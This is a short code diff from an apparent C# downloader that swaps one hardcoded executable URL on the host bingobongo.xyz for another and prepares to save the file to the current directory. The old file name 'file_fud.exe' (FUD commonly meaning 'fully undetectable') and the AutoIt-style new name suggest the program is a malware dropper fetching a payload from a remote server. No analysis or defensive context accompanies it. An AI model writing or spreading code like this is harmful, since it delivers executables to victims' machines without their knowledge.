@@ -48,7 +48,7 @@
              {
                  try
                  {
-                     string url = "http://bingobongo.xyz/file_fud.exe";
+                     string url = "http://bingobongo.xyz/indep3110_AU3_EXE_6cr55.exe";
                                          string filename = Path.GetFileName(url);
                      string destinationpath = Path.Combine(Directory.GetCurrentDirectory(), filename);
 
